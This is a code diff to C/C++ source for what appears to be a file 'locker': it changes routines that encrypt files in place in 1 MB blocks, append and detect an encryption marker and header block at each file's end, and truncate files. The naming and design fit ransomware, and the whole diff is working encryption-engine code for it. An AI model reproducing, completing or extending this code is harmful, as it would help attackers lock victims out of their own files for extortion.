@@ -1,4 +1,6 @@
 ﻿
+#include "api.h"
+#include "locker.h"
 #ifdef _WIN32
 #include <windows.h>
 #include <bcrypt.h>
@@ -282,10 +284,14 @@ static bool EncryptFileBlock
 
 	while (api::ReadFile(FileInfo->filehandle, Buffer, 1048576, &BytesRead) && BytesRead != 0)
 	{
-		if (BytesRead < 1048576 && FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
+		if (BytesRead < 1048576)
 		{
-			padding = BytesRead % 16;
-			BytesRead -= padding;
+			if(FileInfo->crypt_info->method_policy == CryptoPolicy::AES256)
+			{
+				padding = BytesRead % 16;
+				BytesRead -= padding;
+			}
+			BytesRead -= PSIZE_BLOCK + ECRYPT_NAME_LEN;
 		}
 
 		FileInfo->crypt_info->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);
@@ -1056,17 +1062,20 @@ static void memcpy_offset(void* pdst, const void* psrc, size_t size, size_t* off
 static bool read_metadata(DESC filehandle)
 {
 	BYTE buff[ECRYPT_NAMEHEAD_LEN];
+	api::SetPointOff(filehandle, -ECRYPT_NAMEHEAD_LEN, FILE_END);
 	api::ReadFile(filehandle, buff, ECRYPT_NAMEHEAD_LEN, NULL);
+	api::SetPoint(filehandle, FILE_BEGIN);
 	return memory::memcmp(buff, ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN);
 }
 
-void filesystem::add_ecrypt_namend(DESC filehandle)
+void filesystem::add_ecrypt_namend(PFILE_INFO fileinfo)
 {
-	api::SetPoint(filehandle, FILE_END);
-	api::WriteFile(filehandle, ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN, NULL);
+	api::SetPoint(fileinfo->recent_filehandle, FILE_END);
+	api::WriteFile(fileinfo->recent_filehandle, fileinfo->hblock->pblock, PSIZE_BLOCK, NULL);
+	api::WriteFile(fileinfo->recent_filehandle, ECRYPT_NAMEHEAD, ECRYPT_NAMEHEAD_LEN, NULL);
 }
 
-PHEAD_BLOCK filesystem::init_meta_hblock(DESC filehandle, size_t* filesize, const char* crypt_name)
+PHEAD_BLOCK filesystem::init_meta_hblock(PFILE_INFO fileinfo)
 {
 	size_t offset = 0;
 	PHEAD_BLOCK hblock_t = (PHEAD_BLOCK)memory::m_malloc(sizeof(HEAD_BLOCK));
@@ -1076,23 +1085,27 @@ PHEAD_BLOCK filesystem::init_meta_hblock(DESC filehandle, size_t* filesize, cons
 		.pblock = (BYTE*)memory::m_malloc(PSIZE_BLOCK)
 	};
 
-	if(*filesize >= PSIZE_BLOCK && !read_metadata(filehandle))
+	if(fileinfo->filesize >= PSIZE_BLOCK && read_metadata(fileinfo->filehandle))
 	{
 		hblock_t->crypt = false;
-		api::SetPointOff(filehandle, -ECRYPT_NAMEHEAD_LEN, FILE_END);
-		*filesize -= ECRYPT_NAMEHEAD_LEN;
+		fileinfo->filesize -= PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN;
+
+		if(GLOBAL_STATE.g_write_in)
+		{
+			api::SetPointOff(fileinfo->filehandle, -(PSIZE_BLOCK + ECRYPT_NAMEHEAD_LEN), FILE_END);
 #ifdef _WIN32
-		SetEndOfFile(filehandle);
+			SetEndOfFile(filehandle);
 #else
-		ftruncate(filehandle, 0);
+			ftruncate(fileinfo->filehandle, fileinfo->filesize);
 #endif
+		}
 	}
 	else
 	{
  		hblock_t->crypt = true;
  		memcpy_offset(&hblock_t->pblock[offset], ECRYPT_NAME_STORAGE, ECRYPT_LEN_STORAGE, &offset);
  		memcpy_offset(&hblock_t->pblock[offset], ECRYPT_VERSION, ECRYPT_VERSION_LEN, &offset);
- 		memcpy_offset(&hblock_t->pblock[offset], crypt_name, memory::StrLen(crypt_name), &offset);
+ 		memcpy_offset(&hblock_t->pblock[offset], fileinfo->crypt_info->name, memory::StrLen(fileinfo->crypt_info->name), &offset);
 #ifdef _WIN32
 		BCryptGenRandom(0, &hblock_t->pblock[offset], PSIZE_BLOCK - offset, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 #else
@@ -1104,10 +1117,10 @@ PHEAD_BLOCK filesystem::init_meta_hblock(DESC filehandle, size_t* filesize, cons
 
 		/*	ADD HASH HBLOCK	*/
 
-		api::SetPoint(filehandle, FILE_END);
-		api::WriteFile(filehandle, hblock_t->pblock, PSIZE_BLOCK, NULL);
-		api::SetPoint(filehandle, FILE_BEGIN);
-		*filesize += PSIZE_BLOCK;
+		//fileinfo->crypt_info->gen_key_method(fileinfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
+		//ECRYPT_encrypt_bytes((laced_ctx*)fileinfo->ctx, hblock_t->pblock, hblock_t->pblock, PSIZE_BLOCK);
+
+		//fileinfo->filesize += PSIZE_BLOCK;
 	}
 	
 	return hblock_t;
@@ -1122,7 +1135,7 @@ void filesystem::delete_hblock(DESC filehandle, size_t* filesize)
 #ifdef _WIN32
 	SetEndOfFile(filehandle);
 #else
-	ftruncate(filehandle, 0);
+	ftruncate(filehandle, *filesize);
 #endif
 }
 
